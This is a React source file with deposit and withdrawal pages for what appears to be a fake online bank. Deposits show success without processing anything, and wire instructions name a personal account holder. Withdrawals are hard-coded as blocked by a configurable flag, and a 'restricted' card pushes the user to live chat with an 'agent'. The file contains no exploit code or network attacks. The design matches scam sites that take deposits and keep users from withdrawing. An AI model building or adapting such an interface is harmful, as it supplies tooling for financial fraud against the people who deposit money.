import { useState } from "react";
import { fmt } from "./mockData.js";

// ─────────────────────────────────────────────────────────────────
// Set to true  → withdrawal form is replaced with the error + chat CTA
// Set to false → withdrawal works normally
export const WITHDRAWAL_BLOCKED = true;

// Customize the message shown to the user
export const WITHDRAWAL_BLOCK_MSG =
  "Withdrawals are currently restricted on your account. Please contact our customer support team to resolve this before proceeding.";
// ─────────────────────────────────────────────────────────────────

function PageWrap({ title, subtitle, children }) {
  return (
    <div className="p-4 sm:p-6 max-w-2xl mx-auto w-full">
      <div className="mb-6">
        <h1 className="text-2xl font-black text-gray-900">{title}</h1>
        {subtitle && <p className="text-gray-400 text-sm mt-1">{subtitle}</p>}
      </div>
      {children}
    </div>
  );
}

function InputField({ label, type = "text", value, onChange, placeholder, required, hint, prefix, options }) {
  const [f, setF] = useState(false);
  return (
    <div className="mb-4">
      <label className="block text-xs font-bold text-gray-700 mb-1.5 uppercase tracking-wide">
        {label} {required && <span className="text-red-400">*</span>}
      </label>
      {options ? (
        <select value={value} onChange={onChange} onFocus={() => setF(true)} onBlur={() => setF(false)}
          className={`w-full px-3 py-2.5 text-sm border rounded-xl outline-none bg-gray-50 text-gray-800 transition-all appearance-none cursor-pointer ${f ? "border-[#1a1a5e] shadow-[0_0_0_3px_rgba(26,26,94,0.08)] bg-white" : "border-gray-200"}`}>
          <option value="">Select...</option>
          {options.map(o => <option key={o.value} value={o.value}>{o.label}</option>)}
        </select>
      ) : (
        <div className="relative">
          {prefix && <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 text-sm font-semibold">{prefix}</span>}
          <input type={type} value={value} onChange={onChange} placeholder={placeholder} required={required}
            onFocus={() => setF(true)} onBlur={() => setF(false)}
            className={`w-full ${prefix ? "pl-8" : "pl-3"} pr-3 py-2.5 text-sm border rounded-xl outline-none bg-gray-50 text-gray-800 transition-all ${f ? "border-[#1a1a5e] shadow-[0_0_0_3px_rgba(26,26,94,0.08)] bg-white" : "border-gray-200"}`}
          />
        </div>
      )}
      {hint && <p className="text-[11px] text-gray-400 mt-1">{hint}</p>}
    </div>
  );
}

function SuccessBanner({ msg }) {
  if (!msg) return null;
  return (
    <div className="flex items-start gap-3 bg-green-50 border border-green-200 rounded-xl p-4 mb-5">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="2" className="flex-shrink-0 mt-0.5">
        <path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/>
      </svg>
      <p className="text-sm text-green-700 font-semibold">{msg}</p>
    </div>
  );
}

function ErrorBanner({ msg }) {
  if (!msg) return null;
  return (
    <div className="flex items-start gap-3 bg-red-50 border border-red-200 rounded-xl p-4 mb-5">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#dc2626" strokeWidth="2" className="flex-shrink-0 mt-0.5">
        <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
      </svg>
      <p className="text-sm text-red-600 font-semibold">{msg}</p>
    </div>
  );
}

// ─── Opens the ChatLauncher FAB programmatically ──────────────────
function openChatWidget() {
  // Target the FAB button by its class set in ChatLauncher.jsx
  const fab = document.querySelector(".chat-fab, .chat-fab-admin");
  if (fab) { fab.click(); return; }
  // Fallback: any button with the chat bubble SVG path
  const allBtns = Array.from(document.querySelectorAll("button"));
  const chatBtn = allBtns.find(b => b.querySelector('path[d*="M21 15"]'));
  if (chatBtn) chatBtn.click();
}

// ─── Withdrawal blocked card ──────────────────────────────────────
function WithdrawalBlocked() {
  return (
    <div style={{
      background: "white",
      border: "1.5px solid #fed7aa",
      borderRadius: 16,
      overflow: "hidden",
      boxShadow: "0 4px 20px rgba(234,88,12,0.08)",
    }}>
      <style>{`
        @keyframes warnShake {
          0%,100% { transform: translateX(0); }
          20%,60% { transform: translateX(-3px); }
          40%,80% { transform: translateX(3px); }
        }
        .warn-shake { animation: warnShake 0.5s ease 0.2s; }
        .chat-now-btn { transition: filter 0.15s, transform 0.15s, box-shadow 0.15s; }
        .chat-now-btn:hover { filter: brightness(1.1); transform: translateY(-1px); box-shadow: 0 8px 24px rgba(37,99,235,0.35) !important; }
        .chat-now-btn:active { transform: none; }
      `}</style>

      {/* Orange header band */}
      <div style={{
        background: "linear-gradient(135deg,#ea580c,#f97316)",
        padding: "18px 20px 16px",
        display: "flex", alignItems: "center", gap: 14,
      }}>
        <div className="warn-shake" style={{
          width: 44, height: 44, borderRadius: "50%", flexShrink: 0,
          background: "rgba(255,255,255,0.2)",
          display: "flex", alignItems: "center", justifyContent: "center",
          border: "2px solid rgba(255,255,255,0.4)",
        }}>
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.2">
            <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/>
            <line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>
          </svg>
        </div>
        <div>
          <p style={{ color: "white", fontWeight: 900, fontSize: 15, margin: "0 0 3px", fontFamily: "'DM Sans','Trebuchet MS',sans-serif" }}>
            Withdrawal Restricted
          </p>
          <p style={{ color: "rgba(255,255,255,0.8)", fontSize: 12, margin: 0, fontFamily: "'DM Sans','Trebuchet MS',sans-serif" }}>
            Action required before you can proceed
          </p>
        </div>
      </div>

      {/* Body */}
      <div style={{ padding: "20px 20px 22px" }}>
        {/* Error message */}
        <p style={{
          fontSize: 13.5, color: "#431407", lineHeight: 1.65,
          marginBottom: 18, fontFamily: "'DM Sans','Trebuchet MS',sans-serif",
        }}>
          {WITHDRAWAL_BLOCK_MSG}
        </p>

        {/* Steps */}
        <div style={{ background: "#fff7ed", borderRadius: 12, padding: "14px 16px", marginBottom: 20, border: "1px solid #fed7aa" }}>
          <p style={{ fontSize: 10.5, fontWeight: 800, color: "#c2410c", textTransform: "uppercase", letterSpacing: "0.1em", marginBottom: 12, fontFamily: "'DM Sans','Trebuchet MS',sans-serif" }}>
            How to resolve
          </p>
          {[
            { n: "1", text: "Click the button below to open live chat" },
            { n: "2", text: "Explain your withdrawal request to our agent" },
            { n: "3", text: "Our team will resolve your account restriction" },
          ].map(s => (
            <div key={s.n} style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 9, lastChild: { marginBottom: 0 } }}>
              <div style={{
                width: 22, height: 22, borderRadius: "50%", flexShrink: 0,
                background: "#ea580c", color: "white",
                display: "flex", alignItems: "center", justifyContent: "center",
                fontSize: 11, fontWeight: 900, fontFamily: "'DM Sans','Trebuchet MS',sans-serif",
              }}>{s.n}</div>
              <span style={{ fontSize: 13, color: "#7c2d12", fontFamily: "'DM Sans','Trebuchet MS',sans-serif" }}>{s.text}</span>
            </div>
          ))}
        </div>

        {/* Chat CTA */}
        <button
          className="chat-now-btn"
          onClick={openChatWidget}
          style={{
            width: "100%",
            background: "linear-gradient(135deg,#1a1a8e,#2563eb)",
            color: "white", border: "none", borderRadius: 12,
            padding: "14px 20px",
            fontWeight: 800, fontSize: 14.5, cursor: "pointer",
            display: "flex", alignItems: "center", justifyContent: "center", gap: 10,
            fontFamily: "'DM Sans','Trebuchet MS',sans-serif",
            boxShadow: "0 4px 18px rgba(37,99,235,0.3)",
          }}
        >
          <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2">
            <path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/>
          </svg>
          Chat with Customer Support
        </button>

        <p style={{ textAlign: "center", fontSize: 11.5, color: "#9ca3af", marginTop: 10, fontFamily: "'DM Sans','Trebuchet MS',sans-serif" }}>
          🔒 Secure &nbsp;·&nbsp; Avg. response time &lt; 5 min
        </p>
      </div>
    </div>
  );
}

const DEPOSIT_METHODS = [
  { value: "bank-transfer", label: "Bank Transfer / Wire" },
  { value: "check",         label: "Check Deposit"        },
  { value: "cash",          label: "Cash Deposit"         },
  { value: "crypto",        label: "Crypto Deposit"       },
];

// ─── DEPOSIT ─────────────────────────────────────────────────────
export function Deposit({ account }) {
  const [form, setForm] = useState({ method: "", amount: "", reference: "" });
  const [success, setSuccess] = useState("");
  const [error, setError]     = useState("");
  const set = k => e => setForm(f => ({ ...f, [k]: e.target.value }));

  function handleSubmit(e) {
    e.preventDefault();
    setError("");
    if (!form.method || !form.amount) return setError("Please fill all required fields.");
    if (isNaN(form.amount) || Number(form.amount) <= 0) return setError("Enter a valid amount.");
    setSuccess(`Deposit of ${fmt(Number(form.amount))} via ${form.method} submitted successfully! Funds will reflect within 1-3 business days.`);
    setForm({ method: "", amount: "", reference: "" });
  }

  return (
    <PageWrap title="Deposit Funds" subtitle="Add money to your account">
      <div className="rounded-2xl p-5 mb-6 text-white" style={{ background: "linear-gradient(135deg,#1a1a5e,#2a3aa0)" }}>
        <p className="text-white/60 text-xs mb-1">Current Balance</p>
        <p className="text-3xl font-black">{fmt(account.balance)}</p>
        <p className="text-white/40 text-xs mt-1">Account: {account.accountNumber}</p>
      </div>

      <SuccessBanner msg={success} />
      <ErrorBanner msg={error} />

      <div className="bg-white rounded-2xl border border-gray-100 shadow-sm p-6">
        <form onSubmit={handleSubmit}>
          <InputField label="Deposit Method" value={form.method} onChange={set("method")} options={DEPOSIT_METHODS} required />
          <InputField label="Amount (USD)" type="number" value={form.amount} onChange={set("amount")} placeholder="0.00" required prefix="$" />
          <InputField label="Reference / Note" value={form.reference} onChange={set("reference")} placeholder="Optional reference" hint="This will appear on your statement." />

          {form.method === "bank-transfer" && (
            <div className="bg-blue-50 border border-blue-100 rounded-xl p-4 mb-4">
              <p className="text-xs font-bold text-blue-600 uppercase tracking-wide mb-3">Wire Transfer Instructions</p>
              {[
                ["Bank Name",    "Renew Part Bank"    ],
                ["Account Name","Elliana Wilson"      ],
                ["Account No.", account.accountNumber ],
                ["Routing No.", account.routingNumber ],
                ["SWIFT",       account.swift         ],
              ].map(([k, v]) => (
                <div key={k} className="flex justify-between py-1.5 border-b border-blue-100 last:border-0">
                  <span className="text-xs text-blue-400 font-semibold">{k}</span>
                  <span className="text-xs font-bold text-blue-800 font-mono">{v}</span>
                </div>
              ))}
            </div>
          )}

          <button type="submit" className="w-full bg-[#1a1a5e] hover:bg-[#2a2a8e] text-white font-bold py-3 rounded-xl transition-colors">
            Submit Deposit Request
          </button>
        </form>
      </div>
    </PageWrap>
  );
}

// ─── WITHDRAWAL ───────────────────────────────────────────────────
export function Withdrawal({ account }) {
  const [form, setForm]       = useState({ method: "", amount: "", bankName: "", accountNum: "", pin: "" });
  const [success, setSuccess] = useState("");
  const [error, setError]     = useState("");
  const set = k => e => setForm(f => ({ ...f, [k]: e.target.value }));

  const WITHDRAW_METHODS = [
    { value: "bank-transfer", label: "Bank Transfer"     },
    { value: "atm",           label: "ATM Withdrawal"    },
    { value: "check",         label: "Cashier's Check"   },
    { value: "crypto",        label: "Crypto Withdrawal" },
  ];

  function handleSubmit(e) {
    e.preventDefault();
    setError("");
    if (!form.method || !form.amount) return setError("Please fill all required fields.");
    if (isNaN(form.amount) || Number(form.amount) <= 0) return setError("Enter a valid amount.");
    if (Number(form.amount) > account.balance) return setError("Insufficient funds in your account.");
    if (!form.pin || form.pin.length < 4) return setError("Please enter your transaction PIN.");
    setSuccess(`Withdrawal of ${fmt(Number(form.amount))} processed! Please allow 1-2 business days.`);
    setForm({ method: "", amount: "", bankName: "", accountNum: "", pin: "" });
  }

  return (
    <PageWrap title="Withdraw Funds" subtitle="Withdraw money from your account">
      {/* Balance card */}
      <div className="rounded-2xl p-5 mb-6 text-white" style={{ background: "linear-gradient(135deg,#1a1a5e,#2a3aa0)" }}>
        <p className="text-white/60 text-xs mb-1">Available Balance</p>
        <p className="text-3xl font-black">{fmt(account.balance)}</p>
        <p className="text-white/40 text-xs mt-1">Account: {account.accountNumber}</p>
      </div>

      {/* BLOCKED — replace form with error card */}
      {WITHDRAWAL_BLOCKED ? (
        <WithdrawalBlocked />
      ) : (
        <>
          <SuccessBanner msg={success} />
          <ErrorBanner msg={error} />

          <div className="bg-white rounded-2xl border border-gray-100 shadow-sm p-6">
            <form onSubmit={handleSubmit}>
              <InputField label="Withdrawal Method" value={form.method} onChange={set("method")} options={WITHDRAW_METHODS} required />
              <InputField label="Amount (USD)" type="number" value={form.amount} onChange={set("amount")} placeholder="0.00" required prefix="$" hint={`Max: ${fmt(account.balance)}`} />

              {form.method === "bank-transfer" && (
                <>
                  <InputField label="Destination Bank" value={form.bankName} onChange={set("bankName")} placeholder="Chase Bank" required />
                  <InputField label="Destination Account No." value={form.accountNum} onChange={set("accountNum")} placeholder="1234567890" required />
                </>
              )}

              <InputField label="Transaction PIN" type="password" value={form.pin} onChange={set("pin")} placeholder="Enter 4-6 digit PIN" required hint="Required to authorise withdrawal." />

              <button type="submit" className="w-full bg-[#1a1a5e] hover:bg-[#2a2a8e] text-white font-bold py-3 rounded-xl transition-colors">
                Process Withdrawal
              </button>
            </form>
          </div>
        </>
      )}
    </PageWrap>
  );
}